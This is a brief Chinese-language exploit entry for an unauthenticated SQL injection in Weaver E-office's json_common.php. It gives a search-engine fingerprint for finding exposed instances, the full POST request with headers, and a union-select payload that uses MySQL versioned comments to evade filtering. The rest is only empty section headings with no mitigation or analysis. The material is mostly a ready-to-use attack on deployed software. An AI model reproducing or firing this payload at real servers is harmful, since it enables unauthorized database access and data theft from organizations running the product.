# 泛微E-officejson_common.php未授权SQL注入

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="泛微 e-office OA"`
- **请求**：`POST /building/json_common.php HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: LOGIN_LANG=cn; PHPSESSID=3005e422d8ad228271b06c365f6d2987`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 82`

**请求体 / payload**
```
tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/ 1,2,version(),4#2333
```

**其他**
- 泛微E-office json\_common.php 未授权SQL注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微E-office